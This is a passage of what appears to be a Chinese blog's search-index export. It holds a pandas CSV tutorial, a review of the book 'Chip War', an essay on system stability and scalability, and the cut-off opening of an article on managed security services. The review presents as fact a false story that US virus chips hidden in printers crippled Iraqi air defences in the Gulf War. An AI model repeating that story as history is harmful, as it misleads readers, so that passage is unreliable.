class="string">'Male'</span>,[<span class="number">97</span>,<span class="number">99</span>,<span class="number">100</span>]]]</span><br></pre></td></tr></table></figure><h2 id="通过pandas将数据写入csv"><a href="#通过pandas将数据写入csv" class="headerlink" title="通过pandas将数据写入csv"></a>通过pandas将数据写入csv</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.DataFrame(data,columns=[<span class="string">'Name'</span>, <span class="string">'Age'</span>, <span class="string">'Gender'</span>,<span class="string">'Score'</span>])</span><br><span class="line">filename = <span class="string">'data\pd_data.csv'</span></span><br><span class="line">df.to_csv(filename, index=<span class="literal">False</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231216/pd_data.png" alt="数据集"></p><p>我们对原始的数据中的分数Score字段进行求和统计总分TotalScore</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'TotalScore'</span>]=df[<span class="string">'Score'</span>].apply(sum)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231216/pd_data_totalscore.png" alt="数据集TotalScore"></p><h2 id="通过pandas将csv文件中的数据读出"><a href="#通过pandas将csv文件中的数据读出" class="headerlink" title="通过pandas将csv文件中的数据读出"></a>通过pandas将csv文件中的数据读出</h2><p>用pandas将csv文件将数据读出也是非常方便的一行代码就可以搞定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_read_csv=pd.read_csv(filename)</span><br><span class="line">df_read_csv</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231216/pd_data.png" alt="数据集"></p><p>但是会发现从csv文件中读出数据后形成的dataframe数据集对数据中的分数Score字段进行求和统计总分TotalScore会报错！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_read_csv[<span class="string">'TotalScore'</span>]=df_read_csv[<span class="string">'Score'</span>].app</span><br><span class="line"></span><br><span class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> +: <span class="string">'int'</span> <span class="keyword">and</span> <span class="string">'str'</span></span><br></pre></td></tr></table></figure><p>原因是原数据中Score字段中的数据是list但是报错至文件读出来后这个字段变成了字符串，字符串不能求和。</p><p><strong>解决方案</strong><br>将字段中为字符串的值进行转换，转换成list，numpy提供了string转list的方法，当然也可以自己写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeArray</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment">#return [int(item) for item in text[1:-1].split(',')]  #将字串转换成列表</span></span><br><span class="line">    <span class="keyword">return</span> np.fromstring(text[<span class="number">1</span>:<span class="number">-1</span>], sep=<span class="string">','</span>)  <span class="comment">#用numpy提供的方法将字串转换成列表</span></span><br><span class="line"></span><br><span class="line">df_read_csv[<span class="string">'Score'</span>]=df_read_csv[<span class="string">'Score'</span>].apply(makeArray) <span class="comment">#将Score由字符串转成列表</span></span><br><span class="line">df_read_csv[<span class="string">'TotalScore'</span>]=df_read_csv[<span class="string">'Score'</span>].apply(sum)</span><br><span class="line">df_read_csv</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231216/pd_data_totalscore.png" alt="数据集TotalScore"></p><p>可以看到这下Score字段可以正常的进行求和统计总分TotalScore了。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a><br> <center> </p><br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《芯片战争》读后感-得芯片者得天下</title>
      <link href="/posts/41bc24fd/"/>
      <url>/posts/41bc24fd/</url>
      
        <content type="html"><![CDATA[<p>随着社会的进步和技术的发展，以互联网产业化、人工智能等为代表的第四次工业革命席转全球，人工智能技术如火如荼，将整个世界推入了智能化时代。有人说石油是现在工业的血液，那么芯片就是现代工业的大脑。芯片作为现代工业的大脑，它们被广泛应用于各种电子设备、通信、计算机、人工智能等领域。在现代电子设备中发挥着核心的作用。芯片可以控制和操作各种电子设备，执行复杂的运算和数据处理任务，实现各种智能化的功能。随着科技的进步和数字化转型的加速，芯片在各个领域的应用越来越广泛，从计算机、手机、汽车到航空航天、医疗、国防等各个领域，都离不开芯片的支持和推动，半导体芯片在现代技术和工业中的重要性无法被低估。</p><p>近年来在中美贸易战中，芯片起到了关键的战略性作用。在中美贸易战期间，半导体芯片成为了贸易争端的一个焦点和核心议题。2018年4月开始，美国政府针对我国发动了一场以芯片为核心的科技战，我们可以把之称为芯片战争。</p><p>《芯片战争》是一部从企业竞争和国力较量的角度讲述全球芯片产业发展历程的书籍。全书分上部全球芯风云和下部中国芯势力，上部主要讲述了全球芯片产业的发展史和芯片产业链的变迁，下部主要讲述了中国芯片的崛起与芯片产业发展的最新动态。作者余盛是国内战略咨询专家、消费品营销专家及财经作家。这本书是作者继《手机战争》之后关于信息产业领域的第二部力作，目前豆瓣评分是8.6分。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231202/%E8%8A%AF%E7%89%87%E6%88%98%E4%BA%89.png" alt="在这里插入图片描述"></p><h2 id="什么是芯片"><a href="#什么是芯片" class="headerlink" title="什么是芯片"></a>什么是芯片</h2><p>芯片，也被称为集成电路（Integrated Circuit，IC）或微芯片，是一种将多个电子元件（如晶体管、电阻、电容等）集成到一个小而紧凑的半导体片上的技术和产品。现代芯片可以包含数十亿个这样的元件，它们通过复杂的制造过程被制作在一块硅晶圆上。这个过程包括设计、掩模制作、光刻、蚀刻、沉积和测试等多个步骤。最终得到的芯片具有各种功能，例如处理数据（如CPU）、存储信息（如RAM、ROM）、或者进行信号放大和转换（如运算放大器、ADC/DAC）。芯片的应用非常广泛，涵盖了几乎所有的电子设备，从计算机和手机到家用电器、汽车、医疗设备甚至军事装备。由于其体积小、耗电少、成本低、速度快等特点，芯片对于推动科技进步和现代化生活起到了至关重要的作用。</p><h2 id="芯片的发展历程"><a href="#芯片的发展历程" class="headerlink" title="芯片的发展历程"></a>芯片的发展历程</h2><p>集成电路（芯片）在其早期发展阶段受到了美国国防工业的支持和推动。20世纪中叶，随着冷战的升温，美国政府和军方对于新技术的需求增加，特别是对于更小型化、更高效和更可靠的电子设备和计算机系统的需求。集成电路的发展为解决这些需求提供了重要支持。在这一时期，美国国防部和一些政府机构积极支持了集成电路技术的研究和发展。例如，1958年美国国家航空航天局（NASA）成立时，其推动了一系列技术创新，并且在航天器和计算机系统中广泛采用了集成电路。此外，军方对于集成电路在军事通信、导航系统和计算机技术中的应用也给予了关注和资金支持。<br>芯片的发展历程可以追溯到20世纪中叶，经历了几个阶段的演变。以下是芯片发展的主要历史阶段：</p><ul><li>初期概念（1940s - 1950s）： 芯片的概念最早在20世纪40年代末至50年代初由多位科学家和工程师提出。在这一时期，电子元件的集成度很低，电子器件主要通过手工连接构建。</li><li>第一代晶体管技术（1950s - 1960s）： 随着晶体管的发明和使用，电子器件变得更加小型化和可靠。这一时期的电子器件仍然是离散的，但晶体管的引入为集成电路奠定了基础。</li><li>集成电路的诞生（1958年）： 杰克·基尔比（Jack Kilby）和罗伯特·诺伊斯（Robert Noyce）分别在1958年几乎同时提出了集成电路的概念。基尔比使用了间歇技术将几个器件集成到单个硅片上，而诺伊斯则提出了将多个晶体管集成到单个硅片上的全片法。这标志着集成电路的诞生，为后来的芯片技术奠定了基础。</li><li>摩尔定律的确立（1965年）： 戈登·摩尔（Gordon Moore）在1965年提出了著名的摩尔定律，指出集成电路上可容纳的晶体管数量每隔约18至24个月会翻倍。这一定律推动了半导体行业的迅猛发展，促使了芯片技术的不断创新和提升。</li><li>LSI和VLSI技术的发展（1960s - 1970s）： 大规模集成电路（LSI）和超大规模集成电路（VLSI）技术的发展使得更多的晶体管能够集成到单个芯片上。这一时期，芯片的功能和复杂性不断增加，应用领域也逐渐扩展。</li><li>先进制程和微纳米技术（1980s至今）： 随着半导体制造技术的不断进步，制程尺寸不断减小。从1980年代开始，微纳米技术逐渐成为主流，芯片上的晶体管数量呈指数级增长。这一时期，集成电路的制造变得更加复杂，包括光刻、蚀刻、离子注入等高度精密的制程。</li><li>多核处理器和异构集成电路（2000s至今）： 随着对计算能力和功耗效率的不断需求，多核处理器和异构集成电路的兴起成为一个重要趋势。这使得在一个芯片上集成不同类型的处理器和功能成为可能，以满足不同应用的需求。</li></ul><p>芯片的发展历程体现了对集成度、性能、功耗等方面不断追求的过程。这一过程推动了信息技术的发展，影响了现代社会的方方面面。</p><h2 id="芯片技术为什么难攻克"><a href="#芯片技术为什么难攻克" class="headerlink" title="芯片技术为什么难攻克"></a>芯片技术为什么难攻克</h2><p>芯片技术随着这么多少年的快速发展，使得芯片技术变得异常复杂且具有高度专业性，涉及多个复杂的技术、物理和工程难题，对于后来者造成了巨大的技术壁垒。</p><ul><li>制程复杂性：<br>制造芯片的制程非常复杂，涉及多个步骤，如光刻、蚀刻、沉积、离子注入等。随着制程尺寸不断减小，对制程的控制要求越来越高。微纳米技术的应用使得芯片上的元件尺寸趋近或小于100纳米，目前世界上最先进的芯片制造制程是3纳米，需要高度精密的制造工艺。</li><li>摩尔定律挑战：<br>摩尔定律指出，集成电路上的晶体管数量每隔一段时间会翻倍，但随着晶体管尺寸的不断缩小，已经接近原子尺度的极限。超越这一极限需要开发新的技术和材料，例如量子点技术、碳纳米管等。</li><li>材料科学难题：<br>随着制程的进一步微缩，新的材料需求不断涌现。寻找符合要求的材料，能够在小尺寸下保持稳定性、导电性、绝缘性等特性，是一个具有挑战性的问题。</li><li>热管理问题： 集成电路的密度增加，功耗也随之增加。如何有效地管理芯片上的热量，防止过热对性能和寿命造成影响，是一个重要的挑战。</li><li>设计复杂性：<br>芯片设计变得越来越复杂，涉及到大量的晶体管和电路元件。设计出高性能、低功耗、可靠的芯片需要高度专业的技术和工程知识，而且设计周期较长。</li><li>成本压力：<br>高度先进的制程和设备投资成本巨大。发展新技术需要大量的研发资金，而且芯片制造商需要在竞争激烈的市场中保持竞争力，这对技术和成本控制提出了更高要求。</li></ul><h2 id="目前芯片产业的格局"><a href="#目前芯片产业的格局" class="headerlink" title="目前芯片产业的格局"></a>目前芯片产业的格局</h2><p>在全球范围内，目前参与芯片产业领域竞争的主要经济体包括中国、美国、日本、韩国、中国台湾地区、欧州等。</p><ol><li>中美两国： 中美之间的竞争是最引人注目的。美国在半导体领域拥有一些全球领先的企业，而中国则致力于迎头赶超，并投资大量资源用于半导体技术的研发和产业发展。两国之间存在着贸易争端和技术战略的角力。</li><li>日本：日本是全球领先的半导体生产国之一，拥有多家知名半导体公司，如东芝、富士通等。在芯片产业领域竞争，日本致力于发展先进的半导体技术，并将其应用于各种产品和服务中，包括汽车、电子设备和工业设备等。</li><li>韩国：韩国是全球最大的半导体生产国之一，拥有三星、LG等知名半导体公司。在芯片战争中，韩国通过大力发展半导体产业，实现了经济的快速增长和技术赶超。韩国的半导体产品广泛应用于全球市场，包括手机、电视、电脑等电子产品。</li><li>中国台湾：台湾的半导体产业在全球范围内具有重要地位，拥有台积电、联发科技等知名公司。台湾的半导体技术广泛应用于各种电子产品，包括手机、电脑、电视等。在芯片产业领域，台湾致力于维护自己的市场份额和技术优势。</li><li>欧洲：欧洲在芯片产业领域竞争中扮演了重要角色，拥有多家领先的半导体公司，如意法半导体、荷兰恩智浦、荷兰的ASML等。欧洲致力于发展自主的半导体产业，以减少对美国和亚洲的依赖，并推动创新和经济增长。</li></ol><p>芯片产业的格局涉及到全球范围内的多个公司</p><ul><li>主要制造商：<br>台湾半导体制造公司（TSMC）： 作为全球最大的独立芯片制造厂商之一，TSMC提供给包括苹果、英特尔、AMD等公司制造先进的芯片。其技术领先地位使其成为全球芯片制造的中流砥柱。<br>三星电子： 三星不仅在芯片制造领域有重要地位，还在内存、存储器和其他半导体产品方面具有竞争力。<br>英特尔： 作为一家全球领先的芯片设计和制造公司，英特尔在服务器、个人电脑和数据中心等领域占据主导地位。</li><li>设计公司：<br>美国公司： 在芯片设计领域，美国的公司占据主导地位。例如，英特尔、高通、博通、NVIDIA等公司在处理器、通信芯片、图形处理器等领域具有显著的市场份额。<br>中国公司： 中国也在不断加强在芯片设计领域的实力，包括华为旗下的海思、紫光展锐等公司。中国一直在推动本国芯片产业的发展，投资大量资源进行研发和支持本土芯片公司。</li><li>消费电子公司：<br>苹果、三星、华为、小米等： 这些公司不仅是芯片的大规模采购者，同时也在自家产品中采用自家设计的芯片，以提高产品性能和降低成本。</li><li>新兴技术领域的公司：<br>NVIDIA： 在人工智能和图形处理领域，NVIDIA具有显著的地位，其GPU（图形处理器）在深度学习等领域取得了巨大成功。<br>AMD： 在处理器和图形芯片领域，AMD也在市场上展现出竞争力，尤其是在台式机和服务器市场。</li><li>其他：<br>日本的东芝、富士通，韩国的SK海力士等公司在存储器领域具有一定的市场份额。</li></ul><h2 id="中国芯片的发展"><a href="#中国芯片的发展" class="headerlink" title="中国芯片的发展"></a>中国芯片的发展</h2><p>通过海湾战争，中国看到，现代战争已经发展到信息化战争阶段，以芯片为基础的电子战和信息战对战争的进程起着决定性作用。美国军方早在1987年就开始耗巨资研制带有病毒的芯片。海湾战争中，伊拉克军队从法国购买的打印机中就被安装了这种病毒芯片。美军在空袭巴格达之前，将芯片上隐蔽的病毒遥控激活，结果病毒通过打印机侵入伊拉克军事指挥中心的主计算机系统，导致伊军指挥系统失灵，整个防空系统随即瘫痪，完全陷入了被动挨打的境地。如今在军舰、战车、飞机、导弹等现代化武器中，以芯片为核心的电子装备越来越多。过去几次战争的经验显示，如果电子设备失效，武器将变成一堆废铜烂铁。因此，谁拥有了先进的芯片，谁就能掌握战场的主动权。像芯片这种事关国防安全的关键技术，必须掌握在自己国家的手中。</p><p>中国芯片产业的发展可以追溯到20世纪70年代，那时中国的芯片技术还相对落后于世界先进水平。然而，经过几十年的努力和政策支持，中国已经取得了显著的进步，并在全球半导体市场中占据了重要的地位。</p><ul><li>早期发展阶段<br>1970年代初：中国政府开始认识到芯片产业的重要性，并着手建立国内的芯片研发和制造能力。<br>1980年代：随着改革开放的推进，中国开始引进国外的技术和资金，推动了芯片产业的发展。</li><li>进入国际市场（1990年代至今）<br>1990年代：中国逐渐成为全球电子产品的重要生产基地，对芯片的需求量大增。<br>2000年以后：中国政府加大了对芯片产业的支持力度，出台了一系列鼓励自主创新、吸引外资的政策。<br>2014年：“集成电路产业发展纲要”发布，提出“中国制造2025”的战略目标，旨在实现关键领域的自主可控。</li><li>现状与挑战<br>截至2023年，中国已经成为全球最大的芯片消费国，但其在高端芯片的设计和制造方面仍然依赖于外国公司，尤其是在最尖端的工艺节点上。<br>“卡脖子”问题依然存在，即在某些关键技术环节受到国际供应链限制，特别是在光刻机等核心设备以及EDA设计工具等领域。<br>虽然华为海思等企业已经在移动处理器等领域取得了一定突破，但在存储器和高性能计算芯片等方面仍面临挑战。</li><li>未来展望<br>随着中美贸易紧张局势持续，中国更加重视自主发展芯片产业，投入大量资源进行自主研发。<br>国内企业如长江存储、紫光展锐等正在积极开发自己的技术和产品，以减少对外部供应商的依赖。<br>在国家政策的引导下，预计中国的芯片产业将继续保持较快的增长速度，同时也会在技术创新、人才培养和国际合作等方面做出更多的努力。</li></ul><p>尽管面临着诸多挑战，中国芯片产业的发展前景总体来说是乐观的。不过，要想真正达到国际领先水平，还需要克服一系列技术和市场的障碍，并且需要时间来培养相关的生态系统。</p><p>半导体芯片制造这一极其复杂、高风险的业务一直是全球巨头之间的较量，也逐渐演变成为大国之间的竞争。虽然美国不断地在芯片领域打压我们，但是截止目前，美国并没有取得他们想要的结果，而中国的芯片领域在重重压力之下依旧坚持着发展，并且取得了不小的成绩。随着华为Mate60新手机发布后，我们已全面吹响了破除美帝科技霸权的号角，以芯片为代表的高科技之战，是我们崛起之前最后，也必须要打一场硬仗，只有打赢了对美国的芯片战争，才能真正建立完善的工业产业体系，走出一条属于中国的科技强国之路。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统频繁崩溃，如何考虑系统的稳定性和可扩展性？</title>
      <link href="/posts/135a865f/"/>
      <url>/posts/135a865f/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231129/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%A8%B3%E5%AE%9A%E6%80%A7.png" alt="在这里插入图片描述"></p><p>最近网传互联网应用信息系统频繁崩溃，语雀崩完淘宝崩，淘宝崩完滴滴崩，随着业务的发展和技术的进步，对于信息系统的要求也越来越高。信息应用系统为了满足不断增长的用户和业务需求，提高系统的稳定性和扩展性至关重要。</p><p>因为互联网应用面对的是广大的互联网用户，用户和业务需求变化非常快，所以系统既要考虑稳定性又要考虑可扩展性。</p><p>系统稳定性是指系统在面临外部干扰或内部变化时，能够保持其原有状态和功能，避免出现崩溃、失控或不可预测的行为。系统扩展性是指系统在面对增长的业务需求时，能够轻松地扩展其性能、容量和功能的能力。它是一种确保系统能够适应未来发展和变化的重要属性。良好的扩展性可以为企业节省大量的时间和资源，避免在业务增长过程中出现瓶颈。</p><p>系统的稳定性通常包括以下方面：</p><ol><li>容错性：系统在面临错误或异常情况时，能够自动检测并处理错误，避免故障扩散到整个系统。</li><li>可用性：系统在任何情况下都能够提供必要的功能和服务，避免出现单点故障或瓶颈。</li><li>可扩展性：系统能够根据业务需求的变化进行扩展和优化，以适应不断增长的用户数量和业务需求。</li><li>可维护性：系统在运行过程中能够被有效地监控、管理和维护，以确保系统的稳定性和可靠性。</li><li>安全性：系统能够抵御外部攻击和威胁，保护系统的数据和功能不受损害。</li></ol><h2 id="系统稳定性和可扩展性设计参考原则"><a href="#系统稳定性和可扩展性设计参考原则" class="headerlink" title="系统稳定性和可扩展性设计参考原则"></a>系统稳定性和可扩展性设计参考原则</h2><p>标准化和规范化：采用统一的开发标准和规范，确保系统的可维护性和可重用性。这可以减少系统复杂度，提高系统的可扩展性。</p><ul><li>分布式架构：采用分布式架构，将系统划分为多个独立的子系统，每个子系统都可以独立地处理特定的业务需求。这种架构可以提高系统的可扩展性和容错性。</li><li>单一职责原则：每个服务应该只关注自己的功能领域，避免出现跨职责的耦合。这样可以降低系统的复杂性，提高系统的稳定性。</li><li>高内聚、低耦合：每个服务应该高度内聚，同时尽量减少与其他服务的耦合。这样可以减少服务之间的依赖和互相影响，提高系统的稳定性。</li><li>服务自治：每个服务应该具有自我管理和决策能力，以减少对其他服务的依赖。这可以提高系统的可维护性和可扩展性。</li><li>负载均衡：在多个服务实例之间实现负载均衡，可以避免单个服务过载导致整个系统的瘫痪。通过负载均衡器将请求分配到不同的服务实例上，确保系统的稳定性。</li><li>容错性设计：在系统设计中，应该考虑异常情况和错误处理。例如，当某个服务出现故障时，应该能够通过其他服务的备份或冗余设计来保证系统的整体稳定性。</li><li>限流与熔断：在可能出现流量突增的场景中，可以通过限流和熔断机制来防止系统过载。限流可以限制请求的数量，避免系统超负荷运行；熔断则可以在某个服务出现故障时，快速地中断与其他服务的交互，避免故障扩散到整个系统。</li><li>自动化监控与恢复：通过自动化监控工具实时收集和分析系统的运行数据，可以及时发现潜在的问题。同时，自动化恢复工具可以在出现问题时，快速地恢复系统的正常运行。</li><li>版本控制与灰度发布：通过版本控制和灰度发布机制，可以逐步升级和优化每个服务，而不会对整个系统造成过大的影响。这有助于保持系统的稳定性。</li><li>数据一致性：在分布式系统中，数据一致性是一个重要的挑战。通过使用合适的数据复制、校验和验证机制，可以确保数据在多个服务之间的一致性，从而提高系统的稳定性。</li></ul><p>以上这些原则是相辅相成的，需要在系统设计和开发过程中综合考虑并实施。同时，随着业务需求和技术环境的变化，也需要不断优化和改进这些原则，以适应新的挑战和需求。</p><h2 id="如何提高系统的稳定性和可扩展性"><a href="#如何提高系统的稳定性和可扩展性" class="headerlink" title="如何提高系统的稳定性和可扩展性"></a>如何提高系统的稳定性和可扩展性</h2><p>提高系统的稳定性和可扩展性需要从多个方面入手，包括架构设计、技术选型、限流与熔断、数据一致性、负载均衡、自动化监控与恢复、版本控制与灰度发布以及容错性设计等。同时，也需要重视系统的可维护性和安全性，以确保系统能够长期稳定地运行并持续提供服务。<br>以下是一些常见的措施：</p><ul><li>架构设计：在设计系统时，应该考虑系统的整体架构和各个组件的交互方式。采用分布式架构和微服务设计可以提高系统的可扩展性和稳定性。同时，合理划分职责和边界，减少服务之间的耦合也是非常重要的。</li><li>技术选型：选择合适的技术和工具可以提高系统的稳定性和可扩展性。例如，使用容器化技术（如Docker）可以快速部署和扩展服务实例。使用无状态设计和服务降级可以增强系统的容错性。使用消息队列和异步通信可以减少系统之间的依赖和阻塞。</li><li>限流与熔断：在系统设计中，应该考虑限流和熔断机制，以防止流量突增或异常请求对系统造成过载。限流可以限制请求的数量，避免系统超负荷运行；熔断则可以在某个服务出现故障时，快速地中断与其他服务的交互，避免故障扩散到整个系统。</li><li>数据一致性：在分布式系统中，数据一致性是一个重要的挑战。通过使用合适的数据复制、校验和验证机制，可以确保数据在多个服务之间的一致性，从而提高系统的稳定性。使用分布式事务和一致性协议（如Raft或Paxos）可以解决数据一致性问题。</li><li>负载均衡：在多个服务实例之间实现负载均衡，可以避免单个服务过载导致整个系统的瘫痪。通过负载均衡器将请求分配到不同的服务实例上，确保系统的稳定性。使用动态负载均衡算法可以更好地分配负载，提高系统的性能和扩展性。</li><li>自动化监控与恢复：通过自动化监控工具实时收集和分析系统的运行数据，可以及时发现潜在的问题。同时，自动化恢复工具可以在出现问题时，快速地恢复系统的正常运行。自动化监控与恢复可以提高系统的稳定性和可维护性。</li><li>版本控制与灰度发布：通过版本控制和灰度发布机制，可以逐步升级和优化每个服务，而不会对整个系统造成过大的影响。这有助于保持系统的稳定性。使用版本控制工具可以方便地管理和跟踪版本的变更；使用灰度发布可以逐步部署新的版本，同时保证系统的可用性。</li><li>容错性设计：在系统设计中，应该考虑异常情况和错误处理。例如，当某个服务出现故障时，应该能够通过其他服务的备份或冗余设计来保证系统的整体稳定性。使用断路器、超时设置和重试机制等容错性设计可以增强系统的鲁棒性和可用性。</li><li>持续改进与优化：持续改进和优化是提高系统稳定性和可扩展性的关键。通过收集反馈、监控性能和不断改进技术栈可以提高系统的性能和可靠性。同时，不断优化数据流程、业务逻辑和算法也可以提高系统的可扩展性和响应速度。</li></ul><p>目前大部分大型的应用系统都会采用分布式微服务架构设计，微服务架构的系统稳定性可以通过以下几种方式来保障：</p><ul><li>单一职责原则：每个微服务都应该只关注自己的功能领域，并且只暴露必要的接口，以减少与其他微服务的耦合。这种设计原则可以帮助降低系统的复杂性，提高系统的稳定性。</li><li>容错性设计：在微服务架构中，每个微服务都应该具备一定的容错性，以处理异常情况。例如，当某个微服务出现故障时，应该能够通过其他微服务的备份或冗余设计来保证系统的整体稳定性。</li><li>负载均衡：通过在多个微服务之间实现负载均衡，可以避免某个微服务过载导致整个系统的瘫痪。负载均衡器可以分配请求到不同的微服务实例上，确保系统的稳定性。</li><li>限流与熔断：对于可能出现流量突增的场景，可以通过限流和熔断机制来防止系统过载。限流可以限制请求的数量，避免系统超负荷运行；熔断则可以在某个微服务出现故障时，快速地中断与其他微服务的交互，避免故障扩散到整个系统。</li><li>自动化监控与恢复：通过自动化监控工具实时收集和分析系统的运行数据，可以及时发现潜在的问题。同时，自动化恢复工具可以在出现问题时，快速地恢复系统的正常运行。</li><li>版本控制与灰度发布：通过版本控制和灰度发布机制，可以逐步升级和优化每个微服务，而不会对整个系统造成过大的影响。这有助于保持系统的稳定性。</li><li>数据一致性：在微服务架构中，由于数据是分散存储的，因此需要特别关注数据一致性问题。通过使用合适的数据复制、校验和验证机制，可以确保数据在多个微服务之间的一致性，从而提高系统的稳定性。</li></ul><p>随着云计算的发展，信息系统上云已经成为趋势，云平台的弹性扩展和自动化管理的特性，可以提高信息系统的基础平台的稳定性，实现快速扩展和容灾。</p><ul><li>弹性扩展：云平台能够根据业务需求提供弹性的计算资源，可以根据实际需求灵活地扩展或缩减计算资源，如计算能力、存储空间和网络带宽等。这种弹性扩展能力可以满足信息系统随着客户和业务的快速发展，不断调整需求，避免资源的浪费。</li><li>自动化管理：云平台通常提供自动化管理功能，可以帮助快速地部署、配置和管理计算资源。这些自动化工具可以降低管理成本，提高效率。</li><li>负载均衡：云平台可以提供负载均衡服务，将大量的用户请求分散到不同的服务器或节点上，以提高系统的吞吐量和响应速度。这种负载均衡技术可以确保系统在高负载情况下仍能保持较高的性能和可用性。</li><li>容灾备份：云平台通常提供容灾和备份机制，确保系统在遇到故障或灾难时能够快速恢复和正常运行。这些备份和恢复功能可以保护企业的数据和计算资源，避免因故障导致的数据丢失或损坏。</li><li>联合计算：云平台可以提供联合计算服务，将多个计算资源整合在一起，以提供更强大的计算能力。这种联合计算能力可以满足信息系统不断增长的计算需求，提高系统的性能和扩展性。</li><li>安全性：云平台通常采用严格的安全措施来保护企业的数据和计算资源。这些安全措施包括数据加密、访问控制、安全审计等，可以确保信息系统的数据和计算资源不被未经授权的访问或篡改。</li></ul><p>综上所述，信息系统可以通过优化技术采购采用分布式微服务架构，通过云平台的可扩展性实现弹性扩展、自动化管理、负载均衡、容灾备份、联合计算和安全性等方面。使得信息系统能够更好地满足不断变化的需求，提高系统的性能和扩展性。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之了解安全托管服务（MSS）</title>
      <link href="/posts/756bb73f/"/>
      <url>/posts/756bb73f/</url>
      
        <content type="html"><![CDATA[<p>数字化已深入千行百业。数字化将给各行各业带来巨大的变化，现实世界和虚拟世界也将联系得更加紧密。随着云计算、大数据等新技术结合企业级业务的落地，数字时代的安全面临着前所未有的新挑战。近年来，网络安全问题日益严重，在企业数字化转型中，安全需求也变得越来越重要。对于企业来说，一方面是合规要求压力大，随着法规监管的日趋完善，企业需要遵守的合规要求也越来越多，这些法规对企业的网络安全和数据保护提出了更高的要求；另一方面企业面临的外部威胁加剧，随着网络攻击技术的不断发展，黑客、恶意软件等外部威胁也越来越严重。为了应对这些挑战确保企业顺利完成数字化转型并保障信息安全，企业除需要部署专业的安全产品之外，同样需要技术供应商提供专业有效的安全服务。</p><p>对绝大多数企事业单位来说，业务发展才是第一要务，对于安全来说，请专业的人做专业事，于是催生了安全托管运营服务。根据中商产业研究院发布的《2022-2027年中国网络安全行业发展趋势与投资格局研究报告》显示，2022年，中国托管安全服务市场规模约43亿元（6.4亿美元），同比增长16.8%，市场整体保持稳定快速发展。中商产业研究院分析师预测，2023年市场规模将达49.2亿元，2024年将达55.4亿元。</p><p>那么什么是安全托管服务，一般的安全托管服务都覆盖有哪些内容，什么样的企业适合安全托管服务，企业如何通过安全托管服务来构建自身的安全体系，带着这些问题我们一起来了解安全托管服务（MSS）</p><h2 id="一、什么是安全托管服务（MSS）"><a href="#一、什么是安全托管服务（MSS）" class="headerlink" 